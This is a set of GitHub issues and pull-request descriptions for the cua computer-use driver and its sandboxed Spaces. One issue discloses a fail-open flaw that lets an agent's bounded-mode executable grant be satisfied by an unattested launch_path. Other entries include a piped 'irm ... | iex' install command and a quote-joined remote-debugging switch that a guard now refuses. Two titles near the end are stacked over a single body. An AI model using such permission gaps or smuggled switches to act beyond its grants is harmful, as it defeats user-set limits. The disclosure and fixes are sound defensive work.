title: Windows: localhost:<port> network preset blocked - host gateway 10.230.0.1 classified as 'Space in another tree'
body:
## Summary

On a Windows host, `cua network set <space> --network localhost:<port>` is accepted and shown as in effect, but the Space cannot reach the listed host port. The address the Space is given for `host` (`10.230.0.1`) falls inside `10.230.0.0/24`, which the network policy classifies as "a Space in another tree" — an always-blocked category — so every connection is dropped. Reproduced on cua 0.28.3 and again after updating to 0.31.0.

## Environment

- Host: Windows 11 (build 10.0.26300), x86_64, PowerShell 7.7
- cua CLI / daemon: 0.31.0 (installed with `irm https://cua.ai/install.ps1 | iex`); first seen on 0.28.3
- Runtime: built-in Linux runtime (WSL 2) with Docker Desktop engine; runc (gVisor/runsc not available on Docker Desktop)
- Image: `ghcr.io/trycua/linux:24.04` (pulled with `cua image pull` on 2026-11-22)
- Space: local container, created with `cua sb create ubuntu --name desk --wait desktop`
- Host service on the target port: a web app listening on `127.0.0.1:8080` (confirmed with `netstat -ano | findstr :8080`)

## Steps to reproduce

```powershell
cua sb create ubuntu --name desk --wait desktop
cua network set local:desk --network localhost:8080
cua network show local:desk
cua sb exec desk "getent hosts host"
cua sb exec desk "curl -sv --max-time 5 http://host:8080/ 2>&1 | head -20"
cua network log local:desk
```

## Expected

The Space reaches the host's `127.0.0.1:8080` through `host:8080`, as `cua network show` reports ("This computer's ports: host:8080").

## Actual

`cua network show local:desk`:

```
local:desk: Allow this computer's localhost (ports 8080)
  ⚠ Allows this computer's localhost (ports 8080)
  Name: desk.desk (its tree reaches it by this name)
  This computer's ports: host:8080
  Other computers: The tree overlay needs macOS or Linux
  Enforced by this computer, outside the Space: nftables in the container engine's own network namespace, on the Space's bridge port (outside the container, runc and gVisor alike)
  Always blocked:
    Cloud metadata (169.254.169.254 and the other clouds' endpoints)
    Spaces in other trees
    The Cua daemon on this computer
    This computer's own addresses (only "localhost" opens listed ports)
```

Inside the Space:

```
$ getent hosts host
10.230.0.1      host

$ curl -sv --max-time 5 http://host:8080/
* Host host:8080 was resolved.
* IPv4: 10.230.0.1
*   Trying 10.230.0.1:8080...
* Connection timed out after 5007 milliseconds
```

`cua network log local:desk`:

```
local:desk: blocked, most recent first
  Blocked: a Space in another tree (10.230.0.0/24), 5 times
```

Outbound internet from the same Space works (`https://example.com/` → HTTP 200), so general networking is fine; only the host-ports path is blocked.

## Analysis

The host-ports gateway address (`10.230.0.1`) appears to be allocated from the same range the policy treats as other Spaces' trees, so the always-blocked "Spaces in other trees" rule wins over the Space's `localhost:<ports>` allowance. `cua doctor` reports `capabilities.optional.host_ports: host_ports supported` and, for the managed runtime, "network policy is enforced on routed traffic only (the kernel has no nftables bridge family)", which may be related to how this path is classified on WSL 2.

## Workarounds tried

- Updating 0.28.3 → 0.31.0 and recreating the Space: no change.
- Not attempted on purpose: binding the host service to the host's LAN address, since that would expose it to the local network.

## Also observed (happy to split into a separate issue)

After the update to 0.31.0, `cua sb logs desk` fails with `Error response from daemon: No such container: <id>` while `cua sb ls` shows the Space as `ready`. It looks like `logs` queries the Docker Desktop engine, while the Space runs elsewhere. Separately, updating the CLI left an existing Space in `missing` state (`instance desk not found`), and recreating it failed with `cua-spacesd never accepted the Space's token: unauthenticated` until `cua image pull` and `cua daemon start` were run.

title: fix(cua-driver): scroll through the advertised macOS AX page action
body:
## Summary

- Problem this solves: some Catalyst lists, including WhatsApp's message list, ignore arrow keys and background wheel events but still advertise `AXScrollUpByPage` / `AXScrollDownByPage`. On macOS, `scroll` never checked for those actions, so it reported success while the list stayed put.
- What changed: when `scroll` gets an `element_token`, it now looks for `AXScroll<Direction>ByPage` on the element and up to eight of its ancestors, stopping at the window. If one advertises it, `scroll` performs the action `amount` times and returns `path: "ax"`. The AppKit scroll-bar buttons are still tried first. The wheel and keystroke routes are now fallbacks. If the app refuses the action partway, the result gives the number of pages it actually scrolled and does not replay the rest through the wheel. The tool description and the generated macOS reference say this.

The search goes up from the target because the snapshot gives no index to a named group whose only actions are scroll actions (#7780). A message row inside the list carries the token, and the list one level above it carries the action.

## Related work

Fixes #1895

RFC: not required. This adds a delivery route inside the existing `scroll` tool. The schema and result contract are unchanged.

## Compatibility and risk

- User-visible impact (macOS only): a call with an `element_token` whose element or ancestor advertises a page action now scrolls one page per `amount`, whatever `by` says. Web and SwiftUI elements advertise these actions too, so a targeted scroll there now scrolls by pages instead of wheel notches. The issue proposes ignoring `by` for this route.
- Linux and Windows: no change. Their accessibility APIs have no equivalent advertised page action on the target, so the wheel route stays.
- Risk and rollback: if an app advertises the action but does nothing when it runs, it loses the wheel fallback for that target. Reverting the fix commit restores the old route order.

## Validation

- Focused tests and checks: `bin/ci --quick` passes (rustfmt, SPDX headers, image refs, bin/ci sync). The unit test `every_direction_maps_to_its_ax_page_action` and the AppKit E2E cell `macos-appkit-scroll-page-action-ax-background` (`harness_appkit_scroll_uses_the_containers_ax_page_action`) were added. The cell targets a row inside a fixture group that answers only the page actions, then checks `page_offset=2` after scrolling down twice and `page_offset=1` after scrolling up once. Without the fix, the wheel event reaches nothing and the offset stays at 0.
- Not yet run: cargo build, cargo test and the E2E cells. This host runs only the quick checks. Those go to CI and the macOS verification lane.
- Known gaps: the `docs-ref:cua-driver` check needs a build, so the two generated reference files were edited by hand to match the new description. CI's generated-reference check confirms them. A no-target scroll still sends keystrokes to the focused scroller.

## Contributor and release checks

title: Windows: CLI update 0.28.3 -> 0.31.0 loses local Space, create fails on token until daemon started, sb logs can't find Space
body:
## Summary

On a Windows host, updating the cua CLI from 0.28.3 to 0.31.0 with the official installer left an existing local Space unusable, a fresh create failed on token authentication until the image was re-pulled and the daemon started by hand, and afterwards `cua sb logs` cannot find the (working) Space.

## Environment

- Host: Windows 11 (build 10.0.26300), x86_64, PowerShell 7.7
- cua CLI: 0.28.3 → 0.31.0 via `irm https://cua.ai/install.ps1 | iex` (Cua Spaces app also updated; Cua Driver not selected)
- Runtime: built-in Linux runtime (WSL 2) with Docker Desktop engine; runc (gVisor/runsc not available on Docker Desktop)
- Image: `ghcr.io/trycua/linux:24.04`

## 1. Existing Space lost after the update

Before updating, the Space was suspended with `cua sb suspend desk`. After the update:

```
$ cua sb ls
ID                      STATUS   LOCATION  KIND       RUNTIME  EXPIRES  SIZE
local:desk              missing  local     container  runc     -        -

$ cua sb restart desk
cua: local runtime: instance desk not found
```

**Expected:** a suspended Space survives a CLI update, or the installer warns that local Spaces will be lost (and suggests `cua sb checkpoint`).

## 2. Recreate failed: token rejected

After `cua sb rm desk`:

```
$ cua sb create ubuntu --name desk --wait desktop
Preparing 90% ... WARN cua_vmm::container: gVisor (runsc) not available on npipe:////./pipe/cua-engine-<id>; using runc
Waiting for its services
cua: local runtime: [local] sandbox 'http://127.0.0.1:32768' was not ready after 600s: cua-spacesd never accepted the Space's token: unauthenticated: missing or invalid bearer token (Unauthenticated)
```

At that point `cua daemon status` reported `no cua daemon is running` (the installer had not started a 0.31.0 daemon). This sequence fixed it:

```
cua image pull ghcr.io/trycua/linux:24.04
cua daemon start
cua sb create ubuntu --name desk --wait desktop --keep-on-failure   # succeeded
```

**Expected:** the installer starts/restarts the daemon on the new version, and a create with a cached image from an older release either works or fails with a clear "image too old / re-pull" message instead of a 600 s timeout.

## 3. `cua sb logs` cannot find a working Space

With the recreated Space `ready` (`cua sb ls`, `cua sb info desk` both fine; daemon 0.31.0 running):

```
$ cua sb logs desk
Error response from daemon: No such container: a0e4f1363aa9e6c9a9e7ae224a1f878570b9b7dc87bdb41c53fb614a31ac1b46
```

It looks like `logs` queries the Docker Desktop engine (`dockerDesktopLinuxEngine`) while the Space now runs in the cua engine.

## Minor

`cua doctor` reports three failures on a default install that seem to be false positives (everything works with the values unset):

```
[fail] host.defaults.runtime_container_path: ... got "" (default)
[fail] host.defaults.runtime_vm_path: ... got "" (default)
[fail] host.defaults.runtime_microvm_path: ... got "" (default)
```

Also, `cua image ls` returns `unsupported: Cua Cloud has ended ...` rather than an "unknown subcommand" error, which is confusing when exploring the CLI.

title: fix(cua-driver): do not retype a Gecko web write whose AXValue is unreadable
body:
## Why
On macOS, a background `type_text` into a Zen or Firefox page could insert the text twice. Gecko takes the `AXSelectedText` write and applies it after the read-back. The driver already skipped the key fallback when that read-back came back unchanged (#5383). When the `AXValue` before or after the write could not be read, though, it still typed the text again as keys, and the page applied both (the gap noted on the issue).

## What changed
- `after_unlanded_ax_write` treats an unverifiable read-back like an unchanged one when the write was accepted inside a Gecko browser's `AXWebArea`. The write is reported unverified and no keys are sent.
- The unit test pins the new case. Other engines, refused writes and non-web fields still fall back to keys.

## Scope
macOS `type_text` background delivery into Gecko web content only. Chromium, WebKit, Electron and Tauri are unchanged (#8434). Browser chrome fields such as the Zen address bar are also unchanged: Gecko applies those writes in the parent process, so they read back right away. Windows and Linux use different input paths and are not touched.

## Tradeoffs
If a Gecko page accepts the write and then drops it, the caller now gets an unverified result with no text, where before it got the text by keys. The result tells the caller to read the field before retrying, so the failure is visible. A silent double insert was not.

## Blast Radius
Background `type_text` into Firefox-family browsers on macOS, and only when the read-back is unreadable. Every other path is untouched.

## Verification
- The scoped repository checks (`bin/ci --quick`) pass.
- The unit test and the macOS lanes run in CI. I could not reproduce in Zen 1.24.3b on this host, because the shared driver daemon timed out on every input call to Zen.

Fixes #6269

- [x] `bin/ci --quick`

title: fix(cua-driver): bound Windows element-token clicks by the UIA deadline
body:
## Summary

- Problem this solves: on Windows, a click with `element_token` ran the UIA pattern calls (`Invoke`, `Toggle`, `SelectionItem.Select`, `ExpandCollapse.Expand`) and the `EnableWindow` shield around them on a blocking task with no deadline, outside the shared UIA single-flight gate. A provider that never answered, such as UWP Calculator behind `ApplicationFrameHost`, could hold the click indefinitely. The tree walk, window listing and point-based invokes were already bounded; this was the remaining unbounded UIA call on the click path that the issue thread pointed to.
- What changed: element-token pattern dispatch now runs on the deadline-bound UIA worker, the same one point invokes use (`run_element_activation` in `uia/windows_enum.rs`). If the provider misses the deadline, or the gate is held by a wedged call, the click returns `background_unavailable` with `uia_status` and an unknown (`unverifiable`) effect. It sends no fallback input, since a late provider return may still activate the element. Once the deadline fires, no further pattern lookup, `EnableWindow` shield or provider call starts: the flag is checked before each pattern, before the shield and inside it. The pattern order and the foreground-steal shield are unchanged. The pixel and element refusals now share one result builder.

## Related work

Fixes #2207

## Compatibility and risk

- User-visible impact: Windows only, and only on the background element-token click path. A provider that hangs past the deadline now gets a structured refusal that recommends `delivery_mode:"foreground"`, where before the request hung. A healthy provider behaves as before.
- Risk and rollback: element clicks now share the process-wide UIA gate with point invokes, so an element click that starts while a wedged point invoke holds the gate returns `busy` instead of queueing. Revert this commit to roll back.

## Validation

- Focused tests and checks: new unit tests in `tools/click.rs` (`element_activation_tests`) pin the pattern fallthrough order and the rule that neither the shield nor a provider call starts after the deadline. The existing single-flight wedge test in `uia/windows_enum.rs` covers the deadline worker itself. On a Linux host, the crate type-checks and passes clippy for `x86_64-pc-windows-msvc` (`--tests`, no warnings), and the scoped repository checks passed in quick mode.
- Manual or platform evidence: none yet. This host cannot run Windows binaries, so the unit tests were compiled but not run.
- Known gaps or CI still required: the Windows unit-test lane must run the new tests. Live repro against UWP Calculator (get_window_state, element-token click, then get_window_state and list_windows) needs a Windows desktop.

title: feat(cua-driver): decide target-constrained policy on driver-attested identity
body:
## Why

The permission policy saw only the tool name and the caller's arguments. A rule meant to keep clicks inside TextEdit could only constrain a `pid` or `window_id` the caller picked, and nothing checked that the target was still the same when the action ran. Consent prompts sit between the policy decision and dispatch, so that gap can last minutes.

## What changed

- New `attested_target` module in `cua-driver-core`. For input and capture tools, the dispatch boundary resolves the target from OS state: the window owner (from a platform-installed `WindowOwnerResolver` where `list_windows` can report a client-claimed owner, otherwise `list_windows`) and the process instance via the `process_control` fingerprint (pid, start time, executable). It does this only when a configured policy needs the target.
- YAML rules accept a `target:` block next to `constraints:`. Rego input gains `target`. Missing fields fail closed. Unknown fields, or `target` on a tool without one, fail at load time.
- A target is an exact window whose owner the platform verified, or the desktop. Selectors that platforms resolve differently are refused rather than guessed: a `pid` without its `window_id` (the platform picks which window receives it), a `window_id` without its `pid`, an `element_token` whose window disagrees with the declared `pid`/`window_id`, or an `element_token` with a desktop frame and no `pid`. `mouse_drag` and `mouse_button_up`, which deliver to the held button's window, must name its `pid` and `window_id`.
- Dispatch refuses with `target_identity_unavailable` when the target can't be attested: a closed window, a window owned by another pid, a token with no live snapshot window, or a process that can't be fingerprinted. As the last step before the platform tool runs (after consent, input-lane admission and pre-action recording capture), it attests the target again and refuses with `target_identity_changed` if anything differs.

## Scope

Covers `click`, `double_click`, `right_click`, `drag`, `scroll`, `move_cursor`, `mouse_button_down/up`, `mouse_drag`, `type_text`, `press_key`, `hotkey`, `set_value`, `bring_to_front`, `set_window_frame`, `get_window_state`, `get_accessibility_tree`, `get_desktop_state` and `zoom`.

Left out:
- Window owners on Wayland. Linux installs an owner resolver that trusts only the X server's X-Resource pid on X11, never `_NET_WM_PID`, and refuses window targets on Wayland, where only desktop targets attest.
- Focus state. Core has no platform-neutral focus resolver; targets are exact windows instead, so focus does not choose the window a target policy approved.
- `replay_trajectory` and `parallel_mouse_drag`, which carry several targets.
- An atomic OS-level binding. The OS can still change focus or close the window between the last check and input delivery. The docs say this too.

## Open decision

Review found adapter routes that don't stay inside the attested window, even though the window and its owner are verified:
- X11 foreground clicks are sent as desktop XTest at a translated screen point (`platform-linux/src/tools/click.rs`).
- X11 `get_window_state` switches to a root-region screenshot when a popup or transient overlaps the window (`platform-linux/src/tools/get_window_state.rs`).
- Windows window capture falls back to a desktop-region crop (`platform-windows/src/capture.rs`).

macOS foreground clicks post at screen points too. These routes already exist for every window-targeted action and aren't introduced here. Closing them means confining delivery per adapter on macOS, Windows and X11, for example by refusing these routes when a target policy applies, and that needs native verification this PR hasn't had. This stays a draft until that's decided.

## Tradeoffs

- Transport pre-checks (proxy, `serve`, stdio server) run before targets are resolved. They pass `PolicyTarget::Pending`: YAML still checks argument constraints, and target-dependent Rego is deferred to the registry dispatch, which was already the authoritative check.
- With a Rego policy, every call to a covered tool is attested, because Rego rule bodies can't be inspected. YAML attests only tools that have a `target` rule.
- App names and bundle ids are left out of the descriptor. `list_apps` pairs processes with installed apps by executable or command-line basename on Linux and for unpackaged Windows apps, which is discovery, not identity. Policies constrain `executable`, which each OS reports for the exact pid. An OS-attested bundle id (macOS, packaged Windows apps) can be added later.
- Window titles are left out too. They change during normal use and would make the pre-dispatch comparison refuse ordinary calls.

## Blast Radius

Without a policy, or with a YAML policy that has no `target` blocks, dispatch is unchanged: `requires_attested_target` is false and no extra platform calls run. Rego policies now receive a `target` key. Existing rules that ignore it behave the same, except that a Rego transport pre-check no longer denies covered tools early; the daemon still decides them.

## Verification

- `cargo test -p cua-driver-core --test attested_target_policy` (new): 15 tests. The policy is configured through `CUA_DRIVER_POLICY_FILE` against a fake desktop. They cover: an allowed app's window, another app's window, a declared pid paired with another app's window, a desktop action, an unknown `element_token`, `pid`-only calls, three cases where the target changes after authorization (window handed to another app, pid reused by a new process, window closed), a process replaced while the call waits behind another action for the desktop input lane, a process replaced during pre-action recording capture, a platform-verified owner overriding a claimed one, an owner the platform can't verify, conflicting selectors, and an `element_token` attested as its snapshot window. All pass. Each keeper was mutation-checked: with the re-attestation disabled, the after-authorization tests fail; with it moved in front of recording capture, the recording test fails; with the owner resolver ignored, both resolver tests fail.
- `cargo test -p cua-driver-core --lib`: 1387 passed, including the new policy and `attested_target` unit tests.
- `cargo clippy -p cua-driver-core -p platform-linux -p cua-driver-testkit -p cua-driver --all-targets -D warnings` is clean, and `bin/ci --quick` passes. This host can't run the macOS and Windows platform checks or the desktop E2E lanes, and the Linux X-Resource resolver was not run against a live X server; those are left to the scoped repository checks in CI.

Fixes #2262

title: fix(cua-driver): keep the Windows MTA alive so cached WinRT factories stay valid
body:
## Why

The reporter's 0.8.3 Windows daemon died with `0xC0000005` at offsets `0xB03046` and `0x316257`. I disassembled the published `cua-driver-rs-0.8.3-windows-x86_64` binary, whose SHA-256 matches the one in the report. Both offsets fault while reading a COM vtable slot. `0xB03046` is the `IUnknown::Release` tail call. `0x316257` is inside the WGC capture function, which references `Windows.Graphics.Capture.Direct3D11CaptureFramePool`, at the slot-6 call on the cached frame-pool statics factory.

windows-rs caches agile WinRT factories in process statics. Tool calls join and leave the MTA on short-lived threads: paired `CoUninitialize` in `uia/windows_enum.rs` and `uia/focused_document.rs`, and tokio blocking threads that exit when idle. When the last member thread leaves, COM tears down the MTA and unloads the DLLs behind those cached pointers, so the next capture or release reads a vtable in unmapped memory. That fits the "crashes within ~20 seconds of agent activity" pattern and explains why `--no-overlay` did not help. The same code is still on main.

## What changed

- `platform_windows::keep_mta_alive` takes one `CoIncrementMTAUsage` reference for the process lifetime. Building the Windows tool registry calls it once.
- `launch_uwp` and the AppsFolder walk now leave their STA when they finish, so a shared blocking worker never stays an STA where a later WGC capture could load the cached factory.
- A new test binary, `tests/mta_lifetime.rs`, has a thread enter and leave the MTA. It then checks that a fresh thread gets `CO_E_NOTINITIALIZED` before the registry is built and the implicit MTA after. It runs in its own binary so no other test's apartment can keep the MTA open. Windows CI now runs `cargo test -p platform-windows --tests` instead of `--lib`, so this binary runs there and is not only compiled.

## Scope

This covers the Windows daemon and the CLI paths that build the tool registry. Code that calls `platform_windows::wgc` directly without a registry (the capture contract E2E) is unchanged. The paired MTA `CoUninitialize` sites stay as they are, because once the MTA is held for the whole process they are harmless. The standard-user shell helper's STA init is left alone because it runs in its own helper process.

## Blast Radius

Windows only. The process keeps the MTA alive until it exits, which is what windows-rs already does whenever its first factory load finds COM uninitialized. Threads that never call `CoInitializeEx` now land in the implicit MTA instead of getting `CO_E_NOTINITIALIZED`. Every UIA and WGC path already initializes COM itself or accepts an existing apartment.

## Verification

- Disassembly of the reporter's exact 0.8.3 binary at both faulting offsets: both are vtable reads on COM interface pointers, one of them in the WGC frame-pool factory call.
- The scoped repository checks (`bin/ci --quick`): SPDX headers, rustfmt and image refs pass. Clippy, the unit tests and the Windows cross-compile were skipped locally because the host is short on disk, so the Windows CI lanes run them.
- `mta_lifetime.rs` only runs on Windows. It still needs a Windows run on this head, plus a mutation check: remove the `keep_mta_alive()` call and confirm the test fails.

- [ ] `bin/ci` (quick stage ran; heavy stage left to CI)

Fixes #2298

title: fix(cua-driver): split Linux launch_app commands with shell quoting
body:
## Summary

- Problem this solves: Linux `launch_app` split `launch_path` (and `name`) on bare whitespace, so quoting was ignored. `sh -c 'kill -9 1580'` from the report reached `sh` as `-c`, `'kill`, `-9`, `1580'`. `sh` then tried to run `'kill` as its script and never ran the intended body. Quoted `Exec=` paths such as `"/opt/My App/app"` broke the same way. The tool description also said the command ran "via the system shell", which was never true.
- What changed: a new `split_command_line` splits the command into arguments with shell-style quoting. Single quotes are literal. Double quotes accept the XDG `Exec=` escapes. A bare backslash escapes the next character. Nothing is expanded and there is no comment syntax. The command still runs directly, without a shell. Empty input, an unterminated quote, or a trailing backslash is refused with `InvalidInput`. For `name`, that refusal falls through to the `.desktop` match like any other failed spawn. `spawn_launch_command` now also runs the remote-debugging guard on the split arguments, because quotes can join fragments into a switch the raw text never spells out, such as `--remote-debugging-"port"=0`. Both a caller's command and a resolved `.desktop` entry go through it. The `launch_path` description, the generated MCP reference, and the `installed_apps` doc comments now describe what actually happens.

## Related work

Fixes #2661

The issue's other bug, `kill_app` reporting success while the process survives, was already handled on main by #4281: Linux `kill_app` now returns `termination_unconfirmed` / `suspected_noop` when the same process instance outlives SIGKILL. This PR does not touch `kill_app`.

## Tradeoffs

`shlex` and `shell-words` were tried and rejected: both treat an unquoted word starting with `#` as a comment and drop it, so `app #notes` would lose its argument. The splitter here is about forty lines and adds no dependency.

## Compatibility and risk

- User-visible impact: Linux `launch_app` commands that use quotes now reach the program as the arguments the quotes describe. Unquoted commands split exactly as before. A command with an unmatched quote used to be spawned in broken pieces and now returns an error.
- Risk and rollback: the change is limited to the Linux `launch_app` argv builder. Revert the PR to roll back.

## Validation

- Focused tests and checks: `command_line_splits_quotes_and_escapes_without_shell_syntax` covers quotes, escapes, `#` arguments, empty `''` arguments and malformed input. `spawn_refuses_a_quote_joined_remote_debugging_switch` asserts the exact `PermissionDenied` refusal. `launch_app_tests::launch_command_keeps_quoted_arguments_whole` spawns `/bin/sh -c 'echo quoted body > "$0"' <marker>` and waits for the marker to hold `quoted body`. With whitespace splitting it fails. `launch_command_with_unbalanced_quotes_is_refused` asserts `InvalidInput` for an unbalanced and an empty command. The test is the first commit, so the failing state can be checked out.
- Ran here: `bin/ci --quick` (format, lockfiles, headers, lint) passed. The splitter test passed when compiled on its own outside the crate.
- Known gaps or CI still required: `cargo test -p platform-linux` was not run on this shared host. It runs in the scoped repository checks. Nobody has reproduced the reported gVisor hang of the spawned `sh`. With the old split, `sh` should have exited with a syntax error rather than hung, so this PR fixes the argument bug but cannot prove anything about gVisor process behavior.

## Contributor and release checks

- [x] The PR is focused and the description matches the final diff.
- [x] This change does not require an RFC, or the accepted RFC is linked above.
- [x] Tests, documentation, and platform evidence are included or the gap is explained.
- [x] The PR title is a Conventional Commit describing the production change.
- [x] External contributor authorship is preserved, or no external contribution is included.
- [x] If release-tracked files changed but this is intentionally non-releasing, the `no-release` label is applied.
- [ ] `bin/ci` is green and signed off (`bin/ci --signoff`): `bin/ci --quick` is green, but `--signoff` refuses because the docs image-refs check is skipped here (`crane` is not installed on this shared host). That check and the build tier run in CI.

title: feat(cua-driver): persist get_window_state max_elements and max_depth defaults
body:
## Why

Clients that omit `max_elements` or `max_depth` on `get_window_state` always get the built-in budget (250 nodes). Relying on every caller to pass a larger one is error-prone (#6345). This PR adds two saved defaults that apply when a read omits the argument. A value passed on the call still wins.

## What changed

- New config keys `get_window_state.max_elements` and `get_window_state.max_depth`. They are stored in `~/.cua-driver/config.json` as `{"get_window_state": {...}}`, set with `set_config` or `cua-driver config set`, and cleared with `0`, `default` or `null`. `set_config` advertises them as plain integers from 0 to the platform cap. `config reset` clears them too.
- The resolution rules live in `cua-driver-core` (`walk_defaults.rs`, plus `ViewOptions::max_elements` / `max_depth`). The macOS, Windows and Linux adapters only supply their walk caps.
- `get_config` / `config show` report the effective and saved values under `get_window_state` (`config get get_window_state.max_elements` works). The `get_window_state` and `set_config` descriptions, the CLI help and the generated references describe the keys.

## Scope

**Precedence:** a value passed on the call, then the saved default, then the built-in default. The saved default applies only to plain reads, meaning no `query` and no `full_output`.
- `query` reads keep widening to the platform cap, so a small saved budget or depth never hides matches.
- `full_output` reads and internal observation reads keep the platform caps.
- A smaller explicit cap is never overridden by a saved value. The existing widening of an explicit cap on a `query` read is unchanged.
- The truncation line, the `truncated` fields and `timeout_ms` are unchanged.

**Bounds:** a saved value must be a whole number from 1 to the platform walk cap, which is the budget `full_output` uses. That is `max_elements` 2000 on macOS and 5000 on Windows and Linux, and `max_depth` 25 on macOS and Windows. Linux has no depth cap, so any depth of at least 1 is accepted there. A saved value that is out of range for the current platform is ignored with a warning. Per-call values stay unbounded, as they are today. A refused value refuses the whole `set_config` call, so no other key in that call is saved.

**Session overrides:** none. Like the `cursor.*` keys, a `set_config` write is driver-wide and persisted, even from a named session. A session that wants a different budget passes it on the call.

**`since`:** the view key now records the depth the walk used, so a diff never compares reads made with different saved depths.

## Blast Radius

`get_window_state` on all three platforms, plus `set_config`, `get_config` and `cua-driver config`. With nothing saved, every read resolves exactly as before. That is covered by the existing `max_elements_precedence` and `query_reads_search_past_a_small_node_budget` cases, which still pass.

## Verification

- `cargo test -p cua-driver-core --lib`: all pass. The new owner tests are `window_state_view::tests::a_saved_default_applies_only_where_the_argument_is_omitted` (resolution order) and the `walk_defaults::tests::*` cases (persistence, clearing, exact refusal messages, nothing written on refusal).
- `cargo test -p cua-driver --test protocol_tools_call_test -- get_window_state_walk_defaults get_config_and_check` on macOS: both pass. The new test saves the defaults on one daemon, reads them back from a second daemon over the same isolated home, then clears them. It also checks that a refused walk value sent with `cursor.halo` leaves the cursor setting unsaved. Mutation check: with the startup load removed, it fails.
- On macOS, `cargo clippy -D warnings` (core, platform-macos, cua-driver) and the scoped repository checks (`bin/ci --quick`) pass, and the generated reference check (`runner.ts --library cua-driver --check`) is current.
- Not run on this host:
  - Windows and Linux builds and tests. No targets for them are installed here, so those lanes run in CI.
  - The Windows and Linux MCP snapshots were filled in from the same source strings rather than from a native dump. A script reproduced the base snapshots exactly before applying the change.
  - No live desktop read against a real window.

Fixes #6345

- [x] `bin/ci --quick` is green and signed off (`bin/ci --quick --signoff`)

title: The display-awake assertion can be released immediately after a tool call refreshes its idle timer
Bounded-mode executable grants can be satisfied by an unattested launch_path
body:
## Summary

In bounded mode, `resource_matches_application` decides whether a desktop application or window resource matches an `executable:` grant. It prefers `/fingerprint/executable`, the image path the platform adapter read from the OS, but falls back to `resource.executable` and then to `resource.launch_path`. `enrich_application_resource` copies `launch_path` from `list_apps`, and on Windows that value is derived from a Start-Menu shortcut and attached to a running process by executable basename only. When live process attestation is unavailable, an executable grant is therefore satisfied by a launcher path string rather than by the image that is actually running.

## Environment

- cua-driver 0.36.0 at commit `b1633ef91cb003ce1551c3f81accab173e7b603e`.
- Bounded permission mode with a capability manifest that grants one application by `resources.apps[].executable`.
- Authorization resource with a `pid` and a `launch_path` but no `/fingerprint/executable`, the shape `enrich_application_resource` produces when `attest_process_fingerprint` does not return a fingerprint.

## Expected behavior

A resource that carries a `pid` must be authorized only by the executable path attested for that process. If `/fingerprint/executable` is absent, bounded mode should refuse rather than fall back to a launcher command line, because `launch_path` is not an identity of the running image.

## Actual behavior

Exercising the shared matcher with the resource a pid-bearing dispatch produces when the live fingerprint cannot be read gives:

```
resource (no fingerprint) = {"delivery_mode_ceiling":"background","kind":"application_input","launch_path":"/usr/bin/env","pid":4321}
decision = Ok(())
resource (attested /usr/bin/id) = {"delivery_mode_ceiling":"background","fingerprint":{"executable":"/usr/bin/id","pid":4321,"start_time":1},"kind":"application_input","launch_path":"/usr/bin/env","pid":4321}
decision = Err("desktop application pid 4321 is outside the capability manifest")
```

Both resources carry the same `pid` and the same `launch_path`; the only difference is the attested executable. Without a fingerprint, the grant is admitted on `launch_path` alone. With an attested executable that differs from the grant, the same resource is refused.

## Root cause

`resource_matches_application` in `cua-driver-core/src/session_manifest.rs:334` builds its `executable` identity like this:

```rust
let executable = resource
    .pointer("/fingerprint/executable")
    .or_else(|| resource.get("executable"))
    .or_else(|| resource.get("launch_path"))
    .and_then(serde_json::Value::as_str);
```

`enrich_application_resource` in `cua-driver-core/src/tool.rs:1265` adds `/fingerprint/executable` only when `attest_process_fingerprint` succeeds. It then invokes `list_apps` and copies `bundle_id` and `launch_path` from the matching row (`tool.rs:1279`). The enrichment runs before authorization for `application` and `application_input` resources (`tool.rs:2625` and `tool.rs:2729`), so the fallback is reachable on the normal bounded dispatch path whenever attestation fails.

On Windows, `ListAppsTool` in `platform-windows/src/tools/impl_.rs:690` indexes installed apps by the executable basename of their `launch_path` (`impl_.rs:791`), folds each running pid into a matching installed entry by executable name (`impl_.rs:813`), and emits that installed entry's `launch_path` for the running pid (`impl_.rs:836`). `resolve_lnk` in `platform-windows/src/win32/installed_apps.rs:161` defines `launch_path` as the shortcut target plus any arguments (`installed_apps.rs:181`). The basename match never compares the full image path, so a process started from a different directory with the same executable name inherits the installed app's `launch_path`.

The combination is a fail-open downgrade: when the OS-attested image is missing, a grant for `C:\Program Files\App\app.exe` can be satisfied by a Start-Menu shortcut target even though the process behind the pid is a different file with the same basename. That is enough to pass the bounded application or window check and act on a process the manifest did not grant.

## Suggested fix

Stop treating `launch_path` as an executable identity for resources that carry a `pid`. In `resource_matches_application`, match executable grants only against `/fingerprint/executable` (or `resource.executable` where an adapter attests it) and fail closed when neither is present. Keep `launch_path` handling in the pre-launch `launch_app` authorization path, where no process image exists yet. Add a regression that supplies a pid-bearing resource with `launch_path` only and expects a refusal, plus a Windows live test where a running process and an installed shortcut share a basename but not an image path.

title: feat(cua-driver): expose Windows control IDs in structured snapshots
body:
Fixes #2798

Salvaged from #8532 (railapex). Their commit is kept as authored and rebased onto current main with no conflicts. This PR adds nothing on top of it.

## Why

On Windows, `get_window_state` read a control's UIA `AutomationId` only as a fallback label. A control that had an ID but no Invoke, Value, Toggle or Selection pattern got no `element_index` and never appeared in `elements`, so callers could not address it by its developer-assigned ID. RFC #2798 asks for the smallest additive fix: an optional platform-neutral `id` field.

## What changed

- `WindowElement` in `cua-driver-contract` gains an optional `id`. It is skipped when empty, and the manifest, Python and TypeScript bindings are regenerated.
- In Windows snapshots, a node outside a UIA Document subtree with a non-blank `AutomationId` is indexed and carries `id`, even when it is disabled or has no action pattern. Document nodes, their descendants and blank IDs add no `id` and earn no index. Other UIA walks (recording hooks, browser setup and consent UI) still index by actions only.
- A walk that finds indexed IDs but no actions is still reported as degraded (`ax_tree_no_actions`). The empty-wrapper root fallback still decides on action evidence.

## Scope

Windows only, as the RFC's platform decision says. macOS (`AXIdentifier`) and Linux AT-SPI (`AccessibleId`) mappings are left for later PRs; the field stays optional so they can be added. No element lookup by ID.

## Blast Radius

Windows `get_window_state` callers. JSON consumers that ignore unknown fields see no change except new rows: controls that used to be unindexed (Markdown text only, or `observations`) can now appear in `elements` with an index, so later row indices in a fresh snapshot can move. Tokens stay valid within the snapshot that issued them. On the WPF fixture this adds 16 rows; windows without ID-only controls are unchanged (table on #2798).

## Verification

- New unit tests: `only_native_non_blank_ids_index_patternless_nodes` (`uia/mod.rs`) and `structured_ids_are_native_and_preserve_disabled_controls` (`get_window_state.rs`) cover ID-only indexing, disabled controls, Document and web-content exclusion, blank IDs, and unchanged action indexing.
